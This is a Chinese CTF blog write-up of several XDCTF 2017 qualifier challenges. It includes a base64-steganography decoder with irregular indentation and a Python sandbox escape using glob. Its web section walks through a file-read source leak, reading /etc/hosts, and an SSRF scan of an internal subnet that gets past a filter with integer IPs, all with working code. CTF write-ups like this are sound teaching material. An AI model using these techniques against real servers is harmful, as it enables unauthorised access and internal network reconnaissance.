---
layout: 
title: XDCTF 初赛部分题目WriteUp
date: 2017-10-04 13:27:27
tags:
	- CTF
	- XDCTF
	- Writeup
---

国庆假期水了下XDCTF的初赛，最后拿了个33名，没进决赛，不过学了不少东西，记一下
<!-- more -->
## Crypto

### 0x01 基础为王


从给的数据包中，可以找到两个分别名为flag-1 flag-2的图片，提取出来以后，使用Stegosolve进行一次XOR操作即可获得flag

![](https://image.mengsec.com/XDCTF-Crypto-1.png)


### 0x02 基础之Base64

给了长长的一大串base64，解密之后是一个C程序脚本，运行出helloword..

肯定不对啊，谷歌找资料，知道为base64隐写，网上有脚本可以直接进行解密

脚本如下

```python
# -*- coding: cp936 -*-
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('data.txt', 'rb') as f:
	bin_str = ''
	for line in f.readlines():
	    stegb64 = ''.join(line.split())
	    rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())
  		offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))
    	equalnum = stegb64.count('=') #no equalnum no offset
    	if equalnum:
        	bin_str += bin(offset)[2:].zfill(equalnum * 2)
    	print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])
```
直接运行即可



## Web

Web就做出来一个题，比较菜/(ㄒoㄒ)/~~

### 0x01 Web2

题目忘记截图了。

python用来执行系统命令的四种方法都行不通，故意引用一个不存在的模块会在错误报告中，找到绝对路径

	File "/codes/6707603a4141a84912289293db7dcc1f/a.py"

而且glob模块并没有被禁用，可以借助它来列目录


```python
import glob
for filename in glob.glob(r''):
	print filename
```

从绝对路径开始，往下找，flag就在codes目录中，直接open读取输出即可获得flag


### 0x02 Web3
这个题目我没做出来，在此放上大表哥的flag

flag页面的URL为`http://web.ctf.xidian.edu.cn/web3/?file=flag.html`，推测为文件读取。

将flag.html改为index.php获得源码

```php
php
<?php
/*//设置open_basedir
ini_set("open_basedir", "/home/shawn/www/index/");
 */

if (isset($_GET['file'])) {
	$file = trim($_GET['file']);
} else {
	$file = "main.html";
}

// disallow ip
if (preg_match('/^(http:\/\/)+([^\/]+)/i', $file, $domain)) {
	$domain = $domain[2];
	if (stripos($domain, ".") !== false) {
		die("Hacker");
	}
}

if( 	@file_get_contents($file)!=''){
echo file_get_contents($file);

}else{
```



在这里卡了很久，最后推测是ssrf，通过读取`/etc/hosts`文件得知内网ip为`172.18.0.3`。

由于正则表达式过滤了形如`127.0.0.1`的ip，使用整形ip来代替，扫描内网。

```python
python
#-*- coding:utf-8 -*-
import socket
import requests
import urllib

for i in range(1, 256):
	ip = '172.18.0.%d' % i
	int_ip = int(socket.inet_aton(ip).encode('hex'), 16)
	#print int_ip
	r = requests.get('http://web.ctf.xidian.edu.cn/web3/?file='+urllib.quote_plus('http://%d' % int_ip))
	if 'flag' in r.text:
		print ip, int_ip
		print r.text
		break
```


172.18.0.2有flag


```html
172.18.0.2 2886860802
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.13.5</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- do u see me? ha flag{0e34c0321b2b3048d399b41a8ffda584} -->
```
## Misc

### 0x01 邮箱

根据提示

小黑发现一个有趣的博客，于是注册了一个账号，你能找到他的邮箱地址吗？
注意：直接递交邮箱地址即可。

打开数据包后，查找含有 register 的数据流

	http contains "register"

![](https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-1.png)

分别进行追踪流操作，经过尝试可以获得flag

![](https://image.mengsec.com/XDCTF-Misc-%E9%82%AE%E7%AE%B1-2.png)